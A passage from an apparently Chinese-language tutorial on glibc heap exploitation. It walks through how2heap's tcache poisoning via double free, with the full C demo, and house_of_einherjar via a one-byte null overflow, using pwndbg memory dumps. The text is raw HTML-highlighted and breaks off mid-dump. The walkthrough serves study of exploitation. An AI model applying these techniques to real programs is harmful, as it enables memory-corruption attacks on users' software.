class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">64</span>     <span class="built_in">puts</span>(<span class="string">&quot;Launch tcache poisoning&quot;</span>);</span><br><span class="line">  <span class="number">65</span>     <span class="built_in">puts</span>(<span class="string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);</span><br><span class="line">  <span class="number">66</span>     <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">► <span class="number">67</span>     <span class="built_in">puts</span>(<span class="string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);</span><br><span class="line">  <span class="number">68</span>     b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="keyword">long</span>)stack_var;</span><br><span class="line">  <span class="number">69</span></span><br></pre></td></tr></table></figure><p>那么此时我们就成功污染了 tachebin 的内容 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x555555559b20</span> —▸ <span class="number">0x7fffffffe260</span> —▸ <span class="number">0x555555554040</span> ◂— <span class="number">0x400000006</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555559b30</span> —▸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555555559b30</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>我们接着只需要两次 malloc 就能拿到 0x7fffffffe260 这个地址</p><p>完整代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This attack only relies on double free.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="keyword">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The address we want malloc() to return, namely,&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the target address is %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Preparing heap layout&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a chunk for later consolidation&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we are able to cause chunk overlapping&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 1: fill up tcache list&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// simple tcache poisoning</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Launch tcache poisoning&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="keyword">long</span>)stack_var;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we can cash out the target chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The new chunk is at %p\n&quot;</span>, c);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(c==stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// note</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-house-of-einherjar"><a href="#4-house-of-einherjar" class="headerlink" title="4. house_of_einherjar"></a>4. house_of_einherjar</h3><p>这里展示的是通过一字节溢出，取到任意地址的技术</p><p>首先，在堆上伪造一个 chunk </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_einherjar.c</span><br><span class="line">   <span class="number">35</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27; and use it to create a fake chunk\n&quot;</span>);</span><br><span class="line">   <span class="number">36</span>     <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line">   <span class="number">37</span></span><br><span class="line">   <span class="number">38</span>     <span class="comment">// create a fake chunk</span></span><br><span class="line">   <span class="number">39</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk preferably before the chunk(s) we want to overlap, and we must know its address.\n&quot;</span>);</span><br><span class="line"> ► <span class="number">40</span>     <span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line">   <span class="number">41</span></span><br><span class="line">   <span class="number">42</span>     a[<span class="number">0</span>] = <span class="number">0</span>;    <span class="comment">// prev_size (Not Used)</span></span><br><span class="line">   <span class="number">43</span>     a[<span class="number">1</span>] = <span class="number">0x60</span>; <span class="comment">// size</span></span><br><span class="line">   <span class="number">44</span>     a[<span class="number">2</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// fwd</span></span><br><span class="line">   <span class="number">45</span>     a[<span class="number">3</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// bck</span></span><br></pre></td></tr></table></figure><p>该 fake chunk结构如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; malloc_chunk -f &amp;a[<span class="number">0</span>]</span><br><span class="line">Fake chunk | Allocated chunk</span><br><span class="line">Addr: <span class="number">0x5555555592a0</span></span><br><span class="line">prev_size: <span class="number">0x00</span></span><br><span class="line">size: <span class="number">0x60</span></span><br><span class="line">fd: <span class="number">0x5555555592a0</span></span><br><span class="line">bk: <span class="number">0x5555555592a0</span></span><br><span class="line">fd_nextsize: <span class="number">0x00</span></span><br><span class="line">bk_nextsize: <span class="number">0x00</span></span><br></pre></td></tr></table></figure><p>然后我们在堆上布局两个 chunk 分别为 b 和 c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x40</span>                 Used                None              None</span><br><span class="line"><span class="number">0x5555555592d0</span>      <span class="number">0x0</span>                 <span class="number">0x30</span>                 Used                None              None</span><br><span class="line"><span class="number">0x555555559300</span>      <span class="number">0x0</span>                 <span class="number">0x100</span>                Used                None              None</span><br><span class="line">pwndbg&gt; p b</span><br><span class="line">$<span class="number">11</span> = (<span class="keyword">uint8_t</span> *) <span class="number">0x5555555592e0</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt; p c</span><br><span class="line">$<span class="number">12</span> = (<span class="keyword">uint8_t</span> *) <span class="number">0x555555559310</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后此时假设我们有一个 一字节溢出,k可以覆盖到, c chunk 的size 位置，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_einherjar.c</span><br><span class="line">   <span class="number">71</span>     <span class="comment">// This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit</span></span><br><span class="line">   <span class="number">72</span></span><br><span class="line">   <span class="number">73</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nc.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line">   <span class="number">74</span>     <span class="built_in">printf</span>(<span class="string">&quot;c.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line">   <span class="number">75</span></span><br><span class="line"> ► <span class="number">76</span>     <span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span>);</span><br><span class="line">   <span class="number">77</span>     b[real_b_size] = <span class="number">0</span>;</span><br><span class="line">   <span class="number">78</span>     <span class="built_in">printf</span>(<span class="string">&quot;c.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line">   <span class="number">79</span></span><br><span class="line">   <span class="number">80</span>     <span class="built_in">printf</span>(<span class="string">&quot;It is easier if b.size is a multiple of 0x100 so you &quot;</span></span><br><span class="line">   <span class="number">81</span>            <span class="string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);</span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx b<span class="number">-0x10</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5555555592e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559300</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000101</span></span><br><span class="line"><span class="number">0x555555559310</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559320</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559330</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559340</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559350</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559360</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; chunkinfo c<span class="number">-0x10</span></span><br><span class="line">==================================</span><br><span class="line">            Chunk info</span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Can<span class="number">&#x27;</span>t access memory</span><br><span class="line">prev_size : <span class="number">0x0</span></span><br><span class="line">size : <span class="number">0x100</span></span><br><span class="line">prev_inused : <span class="number">1</span></span><br><span class="line">is_mmap : <span class="number">0</span></span><br><span class="line">non_mainarea : <span class="number">0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>那么当执行完之后， c chunk 的 prev_inused 位将被置零</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; chunkinfo c<span class="number">-0x10</span></span><br><span class="line">==================================</span><br><span class="line">            Chunk info</span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Can<span class="number">&#x27;</span>t access memory</span><br><span class="line">prev_size : <span class="number">0x0</span></span><br><span class="line">size : <span class="number">0x100</span></span><br><span class="line">prev_inused : <span class="number">0</span></span><br><span class="line">is_mmap : <span class="number">0</span></span><br><span class="line">non_mainarea : <span class="number">0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>这样会导致 chunk a 被认为是 free 的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x40</span>                 Used                None              None</span><br><span class="line"><span class="number">0x5555555592d0</span>      <span class="number">0x0</span>                 <span class="number">0x30</span>                 Freed                <span class="number">0x0</span>               <span class="number">0x0</span></span><br><span class="line"><span class="number">0x555555559300</span>      <span class="number">0x0</span>                 <span class="number">0x100</span>                Used                None              None</span><br></pre></td></tr></table></figure><p>由于我们在  chunk a 的位置放了一个 fake chunk，我们此时修改了 chunk c的size 位置，同时我们需要其 prev_size 合法，所以也要修改 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">83</span>     <span class="comment">// Write a fake prev_size to the end of b</span></span><br><span class="line">  <span class="number">84</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of &#x27;b&#x27; so that &quot;</span></span><br><span class="line">  <span class="number">85</span>            <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line">  <span class="number">86</span>     <span class="keyword">size_t</span> fake_size = (<span class="keyword">size_t</span>)((c - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>) - (<span class="keyword">uint8_t</span>*) a);</span><br><span class="line">► <span class="number">87</span>     <span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, c - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>, a, fake_size);</span><br><span class="line">  <span class="number">88</span>     *(<span class="keyword">size_t</span>*) &amp;b[real_b_size-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)] = fake_size;</span><br></pre></td></tr></table></figure><p>我们将 chunk b的preve size 修改为 0x60</p><p>紧接着，照样填满 tcache,  然后我们去free chunk c，由于 chunk c 的 prev_inused 为0，则认为前面的 chunk 是free 的此时会有一个向前合并的过程,这样我们就会有两个指针指向 fake chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p c</span><br><span class="line">$<span class="number">18</span> = (<span class="keyword">uint8_t</span> *) <span class="number">0x555555559310</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x5555555592a0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdi  <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x5555555592a8</span> ◂— <span class="number">0x161</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x5555555592b0</span> —▸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x555555559b00</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x5555555592c0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x5555555592d8</span> ◂— <span class="number">0x31</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$<span class="number">19</span> = (<span class="keyword">intptr_t</span> *) <span class="number">0x5555555592a0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后我们此时再 malloc 一个 0x158 大小的chunk ，合并后大小为 0x160, 然后此时 合并后的 chunk 就会被整块取出,  </p><p>然后我们在进行如下操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">119</span>     <span class="keyword">uint8_t</span> *pad = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="number">120</span>     <span class="built_in">free</span>(pad);</span><br><span class="line">  <span class="number">121</span></span><br><span class="line">► <span class="number">122</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nNow we free chunk &#x27;b&#x27; to launch a tcache poisoning attack\n&quot;</span>);</span><br><span class="line">  <span class="number">123</span>     <span class="built_in">free</span>(b);</span><br></pre></td></tr></table></figure><p>那么此时  chunk b 也会加入到  tcache bin里，且指向了刚 free 的 pad chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p b</span><br><span class="line">$<span class="number">25</span> = (<span class="keyword">uint8_t</span> *) <span class="number">0x5555555592e0</span> <span class="string">&quot;\020\233UUUU&quot;</span></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x30</span> [  <span class="number">2</span>]: <span class="number">0x5555555592e0</span> —▸ <span class="number">0x555555559b10</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x100</span> [  <span class="number">7</span>]: <span class="number">0x555555559a10</span> —▸ <span class="number">0x555555559910</span> —▸ <span class="number">0x555555559810</span> —▸ <span class="number">0x555555559710</span> —▸ <span class="number">0x555555559610</span> —▸ <span class="number">0x555555559510</span> —▸ <span class="number">0x555555559410</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br></pre></td></tr></table></figure><p>由于， chunk d 可对 chunkb进行任意修改 （堆块重叠了）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x5555555592b0</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x5555555592a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000161</span>      =====&gt; chunk d</span><br><span class="line"><span class="number">0x5555555592b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000031</span>      =====&gt; fake chunk <span class="keyword">and</span> chunk b</span><br><span class="line"><span class="number">0x5555555592e0</span>:<span class="number">0x0000555555559b10</span><span class="number">0x0000555555559010</span>         ----&gt; chunk b fd -&gt; <span class="number">0x0000555555559b10</span></span><br><span class="line"><span class="number">0x5555555592f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559300</span>:<span class="number">0x0000000000000060</span><span class="number">0x0000000000000100</span>      =====&gt; chunk c</span><br><span class="line"><span class="number">0x555555559310</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559320</span>:<span class="number">0x0000000000000000</span><span 